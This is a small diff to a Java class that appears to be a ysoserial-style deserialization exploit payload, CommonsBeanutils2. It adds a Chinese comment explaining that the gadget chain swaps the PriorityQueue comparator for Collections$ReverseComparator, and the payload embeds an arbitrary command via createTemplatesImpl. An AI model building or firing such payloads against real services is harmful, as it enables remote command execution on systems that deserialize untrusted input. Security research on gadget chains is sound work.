@@ -14,6 +14,7 @@ import java.util.PriorityQueue;
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
 public class CommonsBeanutils2 implements ObjectPayload<Object> {
+//    priorityQueue的comparator类换成了java.util.Collections$ReverseComparator，其余与CB1一样。
 
     public Object getObject(final String command) throws Exception {
         final Object templates = Gadgets.createTemplatesImpl(command);
